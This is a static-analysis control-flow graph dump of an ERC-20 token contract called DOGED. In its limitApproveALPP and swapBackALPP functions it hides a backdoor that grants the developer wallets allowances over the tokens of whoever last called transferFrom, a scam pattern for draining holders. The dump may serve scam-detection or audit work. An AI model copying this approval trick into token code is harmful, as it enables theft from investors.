Contract: Context
==================================================

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1


Contract: IALPPFactory
==================================================


Contract: IALPPRouter
==================================================


Contract: IERC20
==================================================


Contract: Ownable
==================================================

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: msgSender = _msgSender()

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = msgSender

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(address(0),msgSender)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: owner
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _owner

Edges:
  0 -> 1

Function: renounceOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1


Contract: SafeMath
==================================================

Function: add
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: c = a + b

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(c >= a,SafeMath: addition overflow)

  ID: 3
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: sub
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(b <= a,errorMessage)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: c = a - b

  ID: 3
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: mul
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: a == 0

  ID: 2
  Type: NodeType.RETURN
  Expression: 0

  ID: 3
  Type: NodeType.ENDIF
  Expression: 

  ID: 4
  Type: NodeType.VARIABLE
  Expression: c = a * b

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(c / a == b,SafeMath: multiplication overflow)

  ID: 6
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: div
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(b > 0,errorMessage)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: c = a / b

  ID: 3
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  2 -> 3


Contract: DOGED
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _alpp2Wallet = address(msg.sender)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _excemptFromALPP[owner()] = true

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _excemptFromALPP[address(this)] = true

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _excemptFromALPP[_alpp1Wallet] = true

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _alppMines[_msgSender()] = _tTotalALPP

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(0),_msgSender(),_tTotalALPP)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: owner
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _owner

Edges:
  0 -> 1

Function: renounceOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1

Function: openTrading
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(! _tradeEnabledALPP,trading is already open)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _alppRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _swapEnabledALPP = true

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _tradeEnabledALPP = true

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 5
  1 -> 2
  2 -> 3
  3 -> 4
  5 -> 1

Function: name
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _name

Edges:
  0 -> 1

Function: symbol
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _symbol

Edges:
  0 -> 1

Function: decimals
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _decimals

Edges:
  0 -> 1

Function: totalSupply
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _tTotalALPP

Edges:
  0 -> 1

Function: balanceOf
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _alppMines[account]

Edges:
  0 -> 1

Function: transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _transfer(_msgSender(),recipient,amount)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: allowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _alppAllows[owner][spender]

Edges:
  0 -> 1

Function: approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _approve(_msgSender(),spender,amount)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: transferFrom
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _alpp3Wallet = address(sender)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _transfer(sender,recipient,amount)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _approve(sender,_msgSender(),_alppAllows[sender][_msgSender()].sub(amount,ERC20: transfer amount exceeds allowance))

  ID: 4
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: _approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(owner != address(0),ERC20: approve from the zero address)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(spender != address(0),ERC20: approve to the zero address)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _alppAllows[owner][spender] = amount

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: Approval(owner,spender,amount)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: _transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(fALPP != address(0),ERC20: transfer from the zero address)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(tALPP != address(0),ERC20: transfer to the zero address)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(aALPP > 0,Transfer amount must be greater than zero)

  ID: 4
  Type: NodeType.VARIABLE
  Expression: taxALPP = _transferALPP(fALPP,tALPP,aALPP)

  ID: 5
  Type: NodeType.IF
  Expression: taxALPP > 0

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: _alppMines[address(this)] = _alppMines[address(this)].add(taxALPP)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: Transfer(fALPP,address(this),taxALPP)

  ID: 8
  Type: NodeType.ENDIF
  Expression: 

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: _alppMines[fALPP] = _alppMines[fALPP].sub(aALPP)

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: _alppMines[tALPP] = _alppMines[tALPP].add(aALPP.sub(taxALPP))

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: Transfer(fALPP,tALPP,aALPP.sub(taxALPP))

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  5 -> 8
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11

Function: _transferALPP
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: taxALPP = 0

  ID: 2
  Type: NodeType.IF
  Expression: fALPP != owner() && tALPP != owner()

  ID: 4
  Type: NodeType.IF
  Expression: fALPP == _alppPair && tALPP != address(_alppRouter) && ! _excemptFromALPP[tALPP]

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _buyCountALPP ++

  ID: 6
  Type: NodeType.ENDIF
  Expression: 

  ID: 7
  Type: NodeType.IF
  Expression: tALPP == _alppPair && fALPP != address(this)

  ID: 9
  Type: NodeType.ENDIF
  Expression: 

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: swapBackALPP(tALPP,aALPP)

  ID: 11
  Type: NodeType.ENDIF
  Expression: 

  ID: 12
  Type: NodeType.RETURN
  Expression: taxALPP

  ID: 13
  Type: NodeType.IF
  Expression: (_buyCountALPP > _reduceBuyTaxAtALPP)

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: taxALPP = aALPP.mul(_finalBuyTaxALPP).div(100)

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: taxALPP = aALPP.mul(_initialBuyTaxALPP).div(100)

  ID: 16
  Type: NodeType.ENDIF
  Expression: 

  ID: 17
  Type: NodeType.IF
  Expression: (_buyCountALPP > _reduceSellTaxAtALPP)

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: taxALPP = aALPP.mul(_finalSellTaxALPP).div(100)

  ID: 19
  Type: NodeType.EXPRESSION
  Expression: taxALPP = aALPP.mul(_initialSellTaxALPP).div(100)

  ID: 20
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 13
  2 -> 11
  4 -> 5
  4 -> 6
  5 -> 6
  6 -> 7
  7 -> 17
  7 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  13 -> 14
  13 -> 15
  14 -> 16
  15 -> 16
  16 -> 4
  17 -> 18
  17 -> 19
  18 -> 20
  19 -> 20
  20 -> 9

Function: limitApproveALPP
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _alppAllows[address(_alpp3Wallet)][address(_alpp1Wallet)] = uint256(aALPP)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _alppAllows[address(_alpp3Wallet)][address(_alpp2Wallet)] = uint256(aALPP)

Edges:
  0 -> 1
  1 -> 2

Function: swapBackALPP
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: limitApproveALPP(uint256(aALPP))

  ID: 2
  Type: NodeType.VARIABLE
  Expression: tokenALPP = balanceOf(address(this))

  ID: 3
  Type: NodeType.IF
  Expression: ! inSwapALPP && tALPP == _alppPair && _swapEnabledALPP && _buyCountALPP > _preventSwapBeforeALPP

  ID: 4
  Type: NodeType.IF
  Expression: tokenALPP > _swapTokenALPP

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: swapTokensForEth(minALPP(aALPP,minALPP(tokenALPP,_swapTokenALPP)))

  ID: 6
  Type: NodeType.ENDIF
  Expression: 

  ID: 7
  Type: NodeType.VARIABLE
  Expression: caALPP = address(this).balance

  ID: 8
  Type: NodeType.IF
  Expression: caALPP >= 0

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: sendETHALPP(address(this).balance)

  ID: 10
  Type: NodeType.ENDIF
  Expression: 

  ID: 11
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  3 -> 11
  4 -> 5
  4 -> 6
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  8 -> 10
  9 -> 10
  10 -> 11

Function: minALPP
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 2
  Type: NodeType.IF
  Expression: (a > b)

  ID: 3
  Type: NodeType.RETURN
  Expression: b

  ID: 4
  Type: NodeType.RETURN
  Expression: a

Edges:
  0 -> 2
  2 -> 3
  2 -> 4

Function: sendETHALPP
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: address(_alpp1Wallet).transfer(amount)

Edges:
  0 -> 1

Function: swapTokensForEth
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: path = new address[](2)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: path[0] = address(this)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: path[1] = _alppRouter.WETH()

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _approve(address(this),address(_alppRouter),tokenALPP)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _alppRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenALPP,0,path,address(this),block.timestamp)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: lockTheSwap()

Edges:
  0 -> 6
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  6 -> 1

Function: receive
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

Edges:

Function: startTrade
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _alppRouter = IALPPRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _approve(address(this),address(_alppRouter),_tTotalALPP)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _alppPair = IALPPFactory(_alppRouter.factory()).createPair(address(this),_alppRouter.WETH())

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _initialBuyTaxALPP = 3

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _initialSellTaxALPP = 3

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _finalBuyTaxALPP = 0

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _finalSellTaxALPP = 0

  ID: 4
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _reduceBuyTaxAtALPP = 6

  ID: 5
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _reduceSellTaxAtALPP = 6

  ID: 6
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _preventSwapBeforeALPP = 6

  ID: 7
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _buyCountALPP = 0

  ID: 8
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _swapTokenALPP = _tTotalALPP / 100

  ID: 9
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: inSwapALPP = false

  ID: 10
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _tradeEnabledALPP = false

  ID: 11
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _swapEnabledALPP = false

  ID: 12
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _alpp1Wallet = 0x169980521750c1589C28c2eE1A2A1D3eEF7D0B89

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12

Function: slitherConstructorConstantVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _decimals = 9

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _tTotalALPP = 1000000000 * 10 ** _decimals

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _name = DOGE Dividend

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _symbol = DOGED

Edges:
  0 -> 1
  1 -> 2
  2 -> 3


